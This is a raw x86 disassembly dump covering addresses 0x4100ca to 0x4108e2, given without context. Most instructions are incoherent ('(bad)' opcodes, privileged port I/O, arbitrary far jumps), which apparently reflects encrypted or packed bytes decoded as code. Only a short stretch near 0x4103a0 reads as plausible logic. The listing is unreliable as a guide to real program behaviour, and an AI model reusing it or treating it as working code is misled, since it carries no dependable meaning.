  4100ca:	inc    edi
  4100cb:	shl    DWORD PTR [esi],1
  4100cd:	cmp    bh,BYTE PTR [edx+0x73]
  4100d0:	dec    ecx
  4100d1:	out    dx,al
  4100d2:	test   ebx,esi
  4100d4:	xchg   esi,eax
  4100d5:	push   ecx
  4100d6:	cli    
  4100d7:	xor    ebx,ebx
  4100d9:	call   0xbb4f5afd
  4100de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100df:	mov    esp,0x242d63fe
  4100e4:	fiadd  DWORD PTR [esi]
  4100e6:	cs (bad) 
  4100e8:	xchg   edi,eax
  4100e9:	sub    al,0xc2
  4100eb:	test   esp,esi
  4100ed:	mov    dh,0xac
  4100ef:	lea    esp,[esi]
  4100f1:	imul   ebp,DWORD PTR [ecx],0x6d
  4100f4:	fstp   TBYTE PTR [eax+0x7d]
  4100f7:	retfw  
  4100f9:	or     BYTE PTR [ebx+edx*8-0x4b],dl
  4100fd:	gs jo  0x410139
  410100:	xchg   edx,eax
  410101:	inc    edx
  410102:	pop    ds
  410103:	dec    esi
  410104:	loope  0x4100e8
  410106:	int3   
  410107:	fnsave [edx+0x53]
  41010a:	addr16 pop ebp
  41010c:	push   ebp
  41010d:	cmp    edi,DWORD PTR [eax]
  41010f:	sbb    ah,BYTE PTR [ebp-0x46203cf]
  410115:	mov    ecx,0x9c60e342
  41011a:	lock sub ecx,DWORD PTR [ebp+0x4a]
  41011e:	(bad)  
  41011f:	jl     0x410145
  410121:	jge    0x4100f9
  410123:	inc    esi
  410124:	mov    ?,WORD PTR [ebx+0x63]
  410127:	or     al,0x54
  410129:	(bad)  
  41012a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41012b:	mov    bh,0xdc
  41012d:	add    al,0xb6
  41012f:	call   0x6c02cdd4
  410134:	push   0xb696307a
  410139:	pop    eax
  41013a:	adc    eax,ebx
  41013c:	pop    edi
  41013d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013e:	xchg   ecx,eax
  41013f:	adc    eax,0x7d9e701f
  410144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410145:	push   eax
  410146:	scas   eax,DWORD PTR es:[edi]
  410147:	in     eax,dx
  410148:	mov    ?,WORD PTR ds:0x7a3a9ae6
  41014e:	outs   dx,BYTE PTR ds:[esi]
  41014f:	push   ebx
  410150:	out    dx,al
  410151:	push   eax
  410152:	pop    esi
  410153:	scas   al,BYTE PTR es:[edi]
  410154:	pusha  
  410155:	xchg   esp,eax
  410156:	pop    es
  410157:	hlt    
  410158:	push   es
  410159:	push   edi
  41015a:	push   esp
  41015b:	out    0x71,eax
  41015d:	aaa    
  41015e:	cdq    
  41015f:	mov    ah,0x3
  410161:	adc    eax,0x1fdc8ba9
  410166:	and    edi,DWORD PTR [ebx-0x2ca70455]
  41016c:	adc    BYTE PTR [ebp-0x66],ah
  41016f:	cmp    al,0xeb
  410171:	sub    bl,BYTE PTR [ecx+0x32]
  410174:	out    0xea,eax
  410176:	stc    
  410177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410178:	dec    ebp
  410179:	push   edx
  41017a:	imul   edx,eax,0xffffffde
  41017d:	ret    0xaa0c
  410180:	cmp    edi,DWORD PTR [ebp+0x2f]
  410183:	(bad)  
  410184:	jo     0x410203
  410186:	sbb    DWORD PTR [esi-0x435d024d],edi
  41018c:	clc    
  41018d:	pop    ebx
  41018e:	test   eax,0x51c0d958
  410193:	mov    ebx,0x3cf47f0b
  410198:	pop    edi
  410199:	ds push eax
  41019b:	add    DWORD PTR [edx-0x1bb18540],edi
  4101a1:	cdq    
  4101a2:	push   ss
  4101a3:	nop
  4101a4:	sub    eax,0xefebe72f
  4101a9:	dec    esi
  4101aa:	mov    ch,0xfa
  4101ac:	xchg   ebp,eax
  4101ad:	mov    dh,0xba
  4101af:	addr16 (bad) 
  4101b1:	daa    
  4101b2:	mov    edx,0xa21fa95e
  4101b7:	adc    al,0xca
  4101b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ba:	jb     0x4101d8
  4101bc:	push   0x65
  4101be:	fld    QWORD PTR [edi-0x1648eeaa]
  4101c4:	xchg   ecx,eax
  4101c5:	jmp    0x41023e
  4101c7:	fwait
  4101c8:	jmp    0xda757d8c
  4101cd:	adc    al,0x2
  4101cf:	mul    BYTE PTR [eax+0x73]
  4101d2:	jg     0x4101e5
  4101d4:	stos   BYTE PTR es:[edi],al
  4101d5:	sahf   
  4101d6:	ret    
  4101d7:	inc    ebx
  4101d8:	lahf   
  4101d9:	aas    
  4101da:	or     DWORD PTR [eax+ebx*8+0x1261cbb5],ebp
  4101e1:	adc    dl,dh
  4101e3:	rol    BYTE PTR [ebx+0x4b02350e],cl
  4101e9:	xchg   ebp,eax
  4101ea:	inc    eax
  4101eb:	pop    esp
  4101ec:	xor    ebx,DWORD PTR [ecx+0x16a2e85d]
  4101f2:	ds sbb eax,0x2aeca75c
  4101f8:	repz xchg ebx,eax
  4101fa:	fiadd  WORD PTR [ebp-0x772aa393]
  410200:	pop    ds
  410201:	jb     0x4101c8
  410203:	neg    BYTE PTR [ebx+0x3d]
  410206:	icebp  
  410207:	fisub  WORD PTR [esp+eax*8-0x54]
  41020b:	or     ebx,DWORD PTR [ebx]
  41020d:	xor    eax,0x459be45c
  410212:	jno    0x410229
  410214:	inc    ebx
  410215:	pusha  
  410216:	std    
  410217:	push   ebp
  410218:	and    DWORD PTR [edx],esi
  41021a:	or     DWORD PTR [edi],0x25
  41021d:	loop   0x410296
  41021f:	hlt    
  410220:	sbb    al,ch
  410222:	test   BYTE PTR [edi-0x7b1ec10e],dh
  410228:	push   esi
  410229:	test   BYTE PTR [edx],dl
  41022b:	inc    ecx
  41022c:	dec    eax
  41022d:	fadd   QWORD PTR [ebx]
  41022f:	test   DWORD PTR [ebx+0x47],eax
  410232:	test   BYTE PTR [ebp+eax*4-0x19],dl
  410236:	test   al,0x65
  410238:	(bad)  
  41023a:	cmc    
  41023b:	ret    
  41023c:	rcr    BYTE PTR [edx-0x69],0xad
  410240:	loopne 0x410219
  410242:	xchg   edx,eax
  410243:	push   0x11a4a490
  410248:	mov    eax,0x5ce77cf9
  41024d:	jecxz  0x4102be
  41024f:	test   DWORD PTR [edx-0x2ab33f35],ecx
  410255:	daa    
  410256:	jmp    0x41026e
  410258:	ins    BYTE PTR es:[edi],dx
  410259:	mov    ecx,DWORD PTR [ebx+0x79]
  41025c:	mov    edi,0xd60a8564
  410262:	and    ebp,edi
  410264:	dec    esp
  410265:	adc    bl,BYTE PTR [ecx-0x16800826]
  41026b:	xor    bh,cl
  41026d:	mov    eax,0xbb918ae2
  410272:	mov    bl,0xbb
  410274:	mov    edi,0x696a817
  410279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41027a:	push   0x27e130c3
  41027f:	mov    bh,0xf2
  410281:	fcmovnu st,st(7)
  410283:	out    dx,eax
  410284:	add    DWORD PTR [edi+ebx*4+0x22ed9240],0x7a
  41028c:	xor    eax,0x4585411
  410291:	xchg   edx,eax
  410292:	mov    ds:0x7fb61ec7,al
  410297:	in     al,dx
  410298:	xor    cl,BYTE PTR [edi+0x74]
  41029b:	sub    al,BYTE PTR [edi+0x5b]
  41029e:	(bad)  
  41029f:	ja     0x4102ba
  4102a1:	inc    edx
  4102a2:	xchg   ebx,eax
  4102a3:	mov    esi,0x48cf2824
  4102a8:	and    bl,cl
  4102aa:	(bad)  
  4102ab:	mov    esp,0x476c155
  4102b0:	inc    ebx
  4102b1:	dec    ebp
  4102b2:	lods   al,BYTE PTR ds:[esi]
  4102b3:	and    DWORD PTR [eax-0x407c070b],0xffffffff
  4102ba:	aaa    
  4102bb:	inc    esp
  4102bc:	push   esp
  4102bd:	aas    
  4102be:	and    eax,0xb5f253be
  4102c3:	mov    dl,0xb0
  4102c5:	pusha  
  4102c6:	adc    al,0x3d
  4102c8:	jle    0x4102f0
  4102ca:	add    eax,DWORD PTR [esi]
  4102cc:	xor    al,0x86
  4102ce:	call   0xc000:0xea1779fa
  4102d5:	and    eax,DWORD PTR [ecx+ebp*8]
  4102d8:	gs xchg ecx,eax
  4102da:	lods   eax,DWORD PTR ds:[esi]
  4102db:	in     eax,0xd4
  4102dd:	dec    ebx
  4102de:	mov    bl,0xcf
  4102e0:	xchg   esp,eax
  4102e1:	and    BYTE PTR [edi],0x36
  4102e4:	mov    al,0x4a
  4102e6:	fwait
  4102e7:	aam    0x5d
  4102e9:	out    0x7,eax
  4102eb:	inc    esi
  4102ec:	adc    dh,bh
  4102ee:	and    DWORD PTR ds:0x16751457,0xb0bc1561
  4102f8:	cli    
  4102f9:	je     0x410287
  4102fb:	jnp    0x410296
  4102fd:	jmp    0xd5df78e3
  410302:	retf   
  410303:	out    0xfc,eax
  410305:	push   esi
  410306:	repz and bh,BYTE PTR [eax-0x29]
  41030a:	jg     0x410314
  41030c:	aam    0x52
  41030e:	aad    0xbd
  410310:	pop    esp
  410311:	lea    bp,[edx+0x3d]
  410315:	je     0x410388
  410317:	and    ch,BYTE PTR es:0x86c42d72
  41031e:	js     0x4102c4
  410320:	mov    al,ds:0x869e3f2a
  410325:	imul   ebp,esp,0xd395597b
  41032b:	out    0x7,al
  41032d:	adc    edi,DWORD PTR [edx+0x4d]
  410330:	sbb    eax,0x70d401d8
  410335:	mov    cl,BYTE PTR [ebx+0x2146d071]
  41033b:	mov    BYTE PTR [ebp+0x21],cl
  41033e:	test   DWORD PTR [ecx+edi*1],ebx
  410341:	dec    esp
  410342:	ins    BYTE PTR es:[edi],dx
  410343:	inc    edx
  410344:	sub    dl,0xfa
  410347:	inc    eax
  410348:	add    BYTE PTR [eax+0x4e],0xae
  41034c:	setl   BYTE PTR [ecx+0x405560f6]
  410353:	inc    ebp
  410354:	bound  edx,QWORD PTR [eax+0x6766b864]
  41035a:	bound  ebx,QWORD PTR [edi+ebp*4-0x6b31cb33]
  410361:	fcomp  DWORD PTR [edi-0x14]
  410364:	lods   eax,DWORD PTR ds:[esi]
  410365:	sub    eax,0xd5bf0fd9
  41036a:	(bad)  
  41036b:	stc    
  41036c:	setbe  BYTE PTR [ecx-0x666fef75]
  410373:	xchg   DWORD PTR [edx-0x1d2b6fb1],esi
  410379:	mov    ds:0x78c96d6c,eax
  41037e:	sbb    eax,0xe0766f31
  410383:	fs add eax,0xa269c0d8
  410389:	fsubr  st(3),st
  41038b:	sbb    BYTE PTR [eax-0x1e31cc79],dl
  410391:	(bad)  
  410392:	in     eax,0xe6
  410394:	or     DWORD PTR [ecx-0x7dfaf7b3],0x8b000020
  41039e:	inc    ebp
  41039f:	cld    
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xdf21:0x4777bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    eax,0xd946b45f
  4103df:	stos   BYTE PTR es:[edi],al
  4103e0:	pop    ebp
  4103e1:	or     ch,BYTE PTR [esi]
  4103e3:	xchg   ebx,eax
  4103e4:	lea    edi,[eax+ecx*4-0x4d]
  4103e8:	or     BYTE PTR [eax+0x5be5dc7d],al
  4103ee:	mov    dh,0xa0
  4103f0:	lahf   
  4103f1:	out    dx,al
  4103f2:	adc    eax,0x42497a94
  4103f7:	fimul  DWORD PTR [ecx+esi*8]
  4103fa:	call   0x4d08cd2d
  4103ff:	push   eax
  410400:	mov    ah,0xde
  410402:	dec    edi
  410403:	sar    DWORD PTR [ebp-0x18],cl
  410406:	mov    dl,0x4b
  410408:	or     bh,BYTE PTR ds:0x5e9a3d93
  41040e:	sbb    BYTE PTR [ebp+0x15fb1981],0x6a
  410415:	push   edx
  410416:	and    al,0x88
  410418:	or     DWORD PTR [ecx-0x40],ebp
  41041b:	rcl    DWORD PTR [edx+eax*1],1
  41041e:	adc    edi,DWORD PTR [edx+edx*8-0x63]
  410422:	retf   0x1042
  410425:	push   edi
  410426:	jnp    0x41049c
  410428:	dec    edi
  410429:	cli    
  41042a:	mov    eax,ds:0x82ebf86e
  41042f:	imul   BYTE PTR ds:0x63e99394
  410435:	fwait
  410436:	ins    BYTE PTR es:[edi],dx
  410437:	fistp  DWORD PTR [ecx-0x3577a4d2]
  41043d:	sahf   
  41043e:	jae    0x41042e
  410440:	out    0x9f,al
  410442:	pop    edx
  410443:	jne    0x4103dc
  410445:	out    dx,al
  410446:	dec    esp
  410447:	and    al,al
  410449:	pop    ds
  41044a:	test   DWORD PTR [eax+0x47],eax
  41044d:	gs in  eax,0xb9
  410450:	add    esp,ecx
  410452:	jmp    0x410483
  410454:	into   
  410455:	mov    bh,0x5e
  410457:	test   al,0xb
  410459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41045a:	sti    
  41045b:	call   0x8350:0xea7b29d1
  410462:	mov    dh,0x13
  410464:	call   0xd828:0x9a772277
  41046b:	inc    edx
  41046c:	repz icebp 
  41046e:	cmp    esi,DWORD PTR [esi-0xb]
  410471:	dec    ebp
  410472:	popa   
  410473:	fisub  WORD PTR [edx]
  410475:	data16 and ch,BYTE PTR [edx-0x7f010dfc]
  41047c:	test   dh,bh
  41047e:	std    
  41047f:	jns    0x4104fc
  410481:	test   eax,0x70c0794
  410486:	rcr    BYTE PTR ds:0x364581b1,0x80
  41048d:	pop    ss
  41048e:	hlt    
  41048f:	mov    ebx,0x506f9948
  410494:	(bad)  
  410495:	dec    ebx
  410496:	sub    eax,0x5dd4af74
  41049b:	in     eax,dx
  41049c:	out    0x49,eax
  41049e:	stos   DWORD PTR es:[edi],eax
  41049f:	js     0x4104d6
  4104a1:	lock loope 0x410439
  4104a4:	popa   
  4104a5:	jmp    0x8684:0xe7e522b9
  4104ac:	push   ss
  4104ad:	je     0x41049f
  4104af:	in     eax,0x20
  4104b1:	aam    0x35
  4104b3:	adc    BYTE PTR [ecx+0x37],0xf7
  4104b7:	lock lahf 
  4104b9:	pop    esp
  4104ba:	imul   ebp,DWORD PTR [ebp+0x7d],0xc31955e2
  4104c1:	mov    ds:0x8f10c27,al
  4104c6:	xchg   ch,cl
  4104c8:	xchg   ebp,eax
  4104c9:	sub    al,BYTE PTR [ecx]
  4104cb:	retf   
  4104cc:	push   ebp
  4104cd:	fwait
  4104ce:	sbb    ah,0xbb
  4104d1:	dec    eax
  4104d2:	gs add eax,0xb61ecf57
  4104d8:	xchg   ebx,eax
  4104d9:	mov    bl,0xa2
  4104db:	push   ss
  4104dc:	test   DWORD PTR [eax+0x20884cbe],0xce17d1eb
  4104e6:	cmc    
  4104e7:	and    al,0xf9
  4104e9:	test   BYTE PTR [edi+0x690ae2d3],bh
  4104ef:	ss jb  0x4104d7
  4104f2:	jns    0x410542
  4104f4:	sub    dl,ah
  4104f6:	call   0xc57:0xd68234ed
  4104fd:	dec    esp
  4104fe:	cld    
  4104ff:	fcomip st,st(4)
  410501:	stos   DWORD PTR es:[edi],eax
  410502:	out    dx,eax
  410503:	fsub   QWORD PTR [ecx+0x60]
  410506:	xor    DWORD PTR [esi],ebp
  410508:	in     al,dx
  410509:	mov    bh,0x95
  41050b:	adc    cl,BYTE PTR [ebp-0x65]
  41050e:	test   eax,0xf8a2fdec
  410513:	jbe    0x410495
  410515:	adc    cl,0x4f
  410518:	dec    esi
  410519:	ret    
  41051a:	mov    dl,ah
  41051c:	mov    edx,0xb0fe3bb0
  410521:	loopne 0x4104a4
  410523:	lahf   
  410524:	lahf   
  410525:	and    al,0x4b
  410527:	pop    eax
  410528:	mov    ah,0xfd
  41052a:	dec    eax
  41052b:	mov    esp,0xa3496b5c
  410530:	dec    BYTE PTR [esi]
  410532:	scas   eax,DWORD PTR es:[edi]
  410533:	call   0x66ce3861
  410538:	and    al,dh
  41053a:	pop    eax
  41053b:	or     ch,BYTE PTR [ebp-0x56e7548c]
  410541:	cmc    
  410542:	jl     0x4104cc
  410544:	or     al,0x9
  410546:	adc    dl,dl
  410548:	aas    
  410549:	sub    DWORD PTR es:[edx+0x38],eax
  41054d:	xchg   ecx,eax
  41054e:	inc    ebx
  41054f:	aaa    
  410550:	sub    eax,0x6e7e9e79
  410555:	test   DWORD PTR [edx-0x346de546],esi
  41055b:	sbb    ch,bl
  41055d:	retfw  0xfae6
  410561:	popf   
  410562:	nop
  410563:	add    bl,dl
  410565:	addr16 sub al,0xa4
  410568:	xor    edi,esi
  41056a:	ret    
  41056b:	or     al,BYTE PTR [ebp-0x1f1e94cd]
  410571:	mov    edx,0xbe753c20
  410576:	cdq    
  410577:	pop    ds
  410578:	dec    edx
  410579:	ror    ecx,cl
  41057b:	push   ecx
  41057c:	jecxz  0x410543
  41057e:	add    eax,0xd722ee2a
  410583:	aaa    
  410584:	je     0x410566
  410586:	dec    esi
  410587:	shr    BYTE PTR [ebp+0x6950ed4c],0x96
  41058e:	and    al,0xe9
  410590:	xor    ch,BYTE PTR [ebx]
  410592:	jno    0x4105b7
  410594:	gs lock icebp 
  410597:	dec    esi
  410598:	aas    
  410599:	inc    edx
  41059a:	mov    esi,0x25695c0c
  41059f:	out    0x4b,eax
  4105a1:	iret   
  4105a2:	neg    DWORD PTR [edx-0x6]
  4105a5:	test   al,0x12
  4105a7:	mov    al,ds:0x9671c107
  4105ac:	inc    ecx
  4105ad:	sbb    eax,0x836e76ef
  4105b2:	xor    al,0xa8
  4105b4:	mov    dl,0x91
  4105b6:	push   edi
  4105b7:	call   0xabfa:0x24e7b802
  4105be:	mov    ch,0x7b
  4105c0:	xor    dl,BYTE PTR [esi*2-0x3a4ceafb]
  4105c7:	stos   DWORD PTR es:[edi],eax
  4105c8:	and    ebp,eax
  4105ca:	cmp    ebx,DWORD PTR [eax-0x4cd4e177]
  4105d0:	fadd   QWORD PTR [edx+0x34]
  4105d3:	add    edx,0xa2491ae
  4105d9:	jb     0x410586
  4105db:	push   cs
  4105dc:	call   0x1562:0xa723c1b0
  4105e3:	mov    DWORD PTR [edi+0x73b50317],eax
  4105e9:	lods   al,BYTE PTR ds:[esi]
  4105ea:	pop    esi
  4105eb:	dec    ebx
  4105ec:	int3   
  4105ed:	push   ds
  4105ee:	mov    eax,0xba13161
  4105f3:	cli    
  4105f4:	rcl    DWORD PTR [ecx+eiz*2+0xf],cl
  4105f8:	jns    0x410628
  4105fa:	rcl    BYTE PTR [eax],1
  4105fc:	mov    al,ds:0x4c0131c5
  410601:	cld    
  410602:	cld    
  410603:	xor    esi,ecx
  410605:	in     eax,dx
  410606:	xchg   esi,eax
  410607:	push   ss
  410608:	fmul   DWORD PTR [ebx]
  41060a:	aaa    
  41060b:	xchg   ebp,eax
  41060c:	ror    edx,1
  41060e:	xchg   edi,ecx
  410610:	inc    esp
  410611:	push   es
  410612:	popfw  
  410614:	arpl   si,si
  410616:	repz pop esp
  410618:	cmp    DWORD PTR [eax+0x1ce72f6c],0x79dc396d
  410622:	xrelease mov BYTE PTR [eax+0x384eed69],bl
  410629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41062a:	pop    esp
  41062b:	fwait
  41062c:	cmp    cl,BYTE PTR [ebx]
  41062e:	push   0xa0fd6e
  410633:	addr16 clc 
  410635:	pop    edx
  410636:	aad    0x19
  410638:	div    BYTE PTR [eax+ebp*4]
  41063b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063c:	dec    ebx
  41063d:	jns    0x410696
  41063f:	pushf  
  410640:	pop    ds
  410641:	popa   
  410642:	push   ss
  410643:	and    edi,DWORD PTR [si-0xf]
  410647:	(bad)  
  410648:	in     eax,0x64
  41064a:	cmp    bh,BYTE PTR [eax]
  41064c:	sbb    edi,ebx
  41064e:	push   ebx
  41064f:	ja     0x410657
  410651:	and    DWORD PTR [eax-0x7e91918],ecx
  410657:	adc    eax,eax
  410659:	mov    ds:0xdfaa8557,al
  41065e:	retf   0xd9f1
  410661:	(bad)  
  410662:	in     al,0x78
  410664:	loop   0x4105fd
  410666:	jl     0x4106ae
  410668:	inc    esp
  410669:	push   0x2d
  41066b:	sbb    eax,0xf7158c07
  410670:	scas   al,BYTE PTR es:[edi]
  410671:	sub    ch,bh
  410673:	mov    DWORD PTR [eax+0x48],edi
  410676:	dec    ecx
  410677:	cmp    eax,0x779014c0
  41067c:	inc    ebx
  41067d:	cmc    
  41067e:	fdiv   st,st(1)
  410680:	or     al,0xfa
  410682:	sub    BYTE PTR [ecx+eax*4-0x7e],bl
  410686:	pop    ebx
  410687:	lea    ecx,[edx]
  410689:	out    0xc6,al
  41068b:	outs   dx,DWORD PTR ds:[esi]
  41068c:	popa   
  41068d:	nop
  41068e:	xchg   esp,eax
  41068f:	mov    eax,0xf7f22de8
  410694:	sti    
  410695:	(bad)  
  410696:	data16 or BYTE PTR [edi],bl
  410699:	mov    gs,WORD PTR [esi]
  41069b:	(bad)  
  41069c:	shl    BYTE PTR [esi+0x6],1
  41069f:	retw   0x6ac0
  4106a3:	je     0x41065a
  4106a5:	dec    ebx
  4106a6:	cld    
  4106a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a8:	loope  0x4106a1
  4106aa:	sub    al,0x37
  4106ac:	mov    ebx,0x39038fd2
  4106b1:	pop    edi
  4106b2:	and    BYTE PTR [eax+0x7e9b7fbe],0xda
  4106b9:	cmp    al,0x82
  4106bb:	shl    bl,1
  4106bd:	ret    0xf32f
  4106c0:	mov    dl,0x72
  4106c2:	stos   BYTE PTR es:[edi],al
  4106c3:	sub    DWORD PTR [ebx-0x222f3386],edx
  4106c9:	sbb    ebp,DWORD PTR [ebp-0x66]
  4106cc:	add    eax,0x33c96844
  4106d1:	cmp    edi,0x1602fb72
  4106d7:	dec    ebx
  4106d8:	fadd   QWORD PTR [ebp+0x3b]
  4106db:	cmp    DWORD PTR ds:0xf518a924,esp
  4106e1:	jb     0x4106a0
  4106e3:	jae    0x41074f
  4106e5:	mov    al,ds:0xacbca51
  4106ea:	mov    DWORD PTR gs:[ecx+ebp*8+0x4cb7df09],edx
  4106f2:	jo     0x4106d5
  4106f4:	sub    al,0xd4
  4106f6:	xchg   esi,eax
  4106f7:	imul   edi,DWORD PTR [esi],0x849db2c
  4106fd:	shr    BYTE PTR [eax],0x4f
  410700:	push   ebp
  410701:	mov    ch,0xda
  410703:	int    0x9f
  410705:	aam    0xac
  410707:	adc    eax,DWORD PTR [edx-0xb]
  41070a:	fist   WORD PTR [ecx-0x13170a9e]
  410710:	ror    edi,1
  410712:	in     al,dx
  410713:	bound  ebx,QWORD PTR [edi]
  410715:	mov    edx,0xad84db7a
  41071a:	bound  esp,QWORD PTR [ecx+0x36]
  41071d:	outs   dx,BYTE PTR ds:[esi]
  41071e:	mov    eax,ds:0x7daba0cb
  410723:	jl     0x410715
  410725:	ret    0x82f6
  410728:	mov    ebp,0x991bbc2
  41072d:	lds    edi,FWORD PTR [esi+edi*1-0x3f]
  410731:	jmp    0x391cc785
  410736:	pop    eax
  410737:	fisttp QWORD PTR [edx]
  410739:	dec    ebp
  41073a:	dec    ecx
  41073b:	pop    eax
  41073c:	fldcw  WORD PTR [ebp-0x634dba9e]
  410742:	out    0xa7,al
  410744:	sub    edx,DWORD PTR [edx+eiz*8-0x49b3647]
  41074b:	adc    edi,DWORD PTR [eax+ecx*1-0x57]
  41074f:	data16 test al,0xc8
  410752:	rol    DWORD PTR [ecx+0x56],0xef
  410756:	sbb    ah,bl
  410758:	scas   eax,DWORD PTR es:[edi]
  410759:	xor    BYTE PTR [eax],0x7f
  41075c:	test   DWORD PTR [edx],0x8b36b90
  410762:	out    0x5c,al
  410764:	pop    es
  410765:	imul   eax,DWORD PTR [edx-0x73c442de],0xfd8c756b
  41076f:	lds    eax,FWORD PTR [eax-0x553906b3]
  410775:	mov    ah,0xbe
  410777:	popa   
  410778:	in     al,dx
  410779:	scas   eax,DWORD PTR es:[edi]
  41077a:	fadd   st,st(0)
  41077c:	xchg   edi,eax
  41077d:	inc    esi
  41077e:	cmp    ecx,edi
  410780:	push   esp
  410781:	or     al,0x42
  410783:	xor    al,0xfc
  410785:	cs mov dh,0x8b
  410788:	jne    0x410792
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	fst    st(3)
  4107aa:	imul   ecx,edi,0x7070468b
  4107b0:	mov    ds:0x9670707d,eax
  4107b5:	adc    al,0x3b
  4107b7:	adc    dh,0x53
  4107ba:	popa   
  4107bb:	aaa    
  4107bc:	xor    al,0xc5
  4107be:	push   cs
  4107bf:	pusha  
  4107c0:	in     eax,dx
  4107c1:	stc    
  4107c2:	stos   BYTE PTR es:[edi],al
  4107c3:	push   ds
  4107c4:	push   esp
  4107c5:	fwait
  4107c6:	and    eax,0xb1895083
  4107cb:	jl     0x410810
  4107cd:	lods   eax,DWORD PTR ds:[esi]
  4107ce:	push   esp
  4107cf:	cld    
  4107d0:	aad    0x12
  4107d2:	aam    0x29
  4107d4:	xchg   ecx,eax
  4107d5:	ins    DWORD PTR es:[edi],dx
  4107d6:	adc    BYTE PTR [edi-0x58ddeec1],0x3
  4107dd:	fadd   QWORD PTR [ebx+edx*1]
  4107e0:	mov    ecx,0x93e10a27
  4107e5:	imul   eax,DWORD PTR [ebp+0x41],0x864cbb34
  4107ec:	sbb    BYTE PTR [eax+0x3e73046c],ah
  4107f2:	pop    edx
  4107f3:	mov    WORD PTR ds:0x10a32512,fs
  4107f9:	pop    es
  4107fa:	cmp    esi,0x907e1047
  410800:	(bad)  
  410801:	in     eax,0x42
  410803:	add    al,0x66
  410805:	pop    es
  410806:	cmp    DWORD PTR [esi],0x88a61e2
  41080c:	rcl    BYTE PTR [esi+0x17d75448],0x68
  410813:	in     al,dx
  410814:	xchg   ebp,eax
  410815:	mov    dh,0xb2
  410817:	push   0xfffffffa
  410819:	popa   
  41081a:	aaa    
  41081b:	stos   DWORD PTR es:[edi],eax
  41081c:	popa   
  41081d:	ret    
  41081e:	sbb    cl,dl
  410820:	inc    ecx
  410821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410822:	iret   
  410823:	or     edi,edx
  410825:	jmp    0x4107c7
  410827:	jmp    0xc7f:0x70aa8179
  41082e:	and    ecx,DWORD PTR [edx+0x79e4bc30]
  410834:	mov    ah,0x4e
  410836:	xchg   ecx,eax
  410837:	cli    
  410838:	leave  
  410839:	popf   
  41083a:	mov    dl,0xde
  41083c:	xchg   edx,eax
  41083d:	xchg   BYTE PTR [ebx],dh
  41083f:	adc    al,0xfc
  410841:	sub    al,0xc6
  410843:	xchg   edx,eax
  410844:	aam    0x13
  410846:	cmc    
  410847:	cmc    
  410848:	xor    al,0xf6
  41084a:	out    dx,al
  41084b:	xchg   esp,eax
  41084c:	or     ebp,DWORD PTR fs:[edi-0x2b3002ba]
  410853:	xchg   BYTE PTR [eax+0x1f],ch
  410856:	mov    DWORD PTR [ebp+edi*4-0x58f5b9b1],ecx
  41085d:	mov    bh,BYTE PTR [edx+0x482def6c]
  410863:	icebp  
  410864:	pusha  
  410865:	adc    BYTE PTR [ebp-0x2d],ch
  410868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410869:	fs or  dh,al
  41086c:	lahf   
  41086d:	mov    esp,ecx
  41086f:	mov    gs,WORD PTR [esi+ecx*4-0x71]
  410873:	and    BYTE PTR [ecx+0x72274513],ch
  410879:	xchg   edi,eax
  41087a:	xor    eax,0x17e8045b
  41087f:	arpl   WORD PTR [ecx],di
  410881:	inc    edi
  410882:	jp     0x4108b6
  410884:	sbb    al,0x31
  410886:	cld    
  410887:	sub    DWORD PTR [edx],esi
  410889:	xor    BYTE PTR [edi],al
  41088b:	daa    
  41088c:	adc    BYTE PTR [esi-0x49],dh
  41088f:	int    0xfa
  410891:	enter  0x79cf,0x2b
  410895:	outs   dx,BYTE PTR ds:[esi]
  410896:	lds    eax,FWORD PTR [ebx+edx*1-0x39]
  41089a:	pop    ebp
  41089b:	or     al,BYTE PTR [ecx+0x5f0f820a]
  4108a1:	push   0x9e650bb2
  4108a6:	dec    ebp
  4108a7:	xchg   ebx,eax
  4108a8:	mov    eax,0x30b3be02
  4108ad:	in     eax,dx
  4108ae:	dec    eax
  4108af:	dec    edi
  4108b0:	pop    ss
  4108b1:	mov    ds:0xa942033d,al
  4108b6:	dec    ecx
  4108b7:	loop   0x4108fc
  4108b9:	add    BYTE PTR [ecx-0x11],al
  4108bc:	test   DWORD PTR [ecx+0x27],ebp
  4108bf:	pop    eax
  4108c0:	add    BYTE PTR [edi],dl
  4108c2:	mov    al,0xd7
  4108c4:	add    eax,esi
  4108c6:	(bad)  
  4108c7:	(bad)  
  4108c8:	jmp    0x209d:0x2d51d5d6
  4108cf:	fcom   DWORD PTR [ecx]
  4108d1:	ror    BYTE PTR [edi],1
  4108d3:	into   
  4108d4:	icebp  
  4108d5:	xor    al,0xf
  4108d7:	sub    eax,0x65ccc369
  4108dc:	retf   
  4108dd:	(bad)  
  4108df:	sbb    al,0x4e
  4108e1:	inc    edi
  4108e2:	aad    0x70
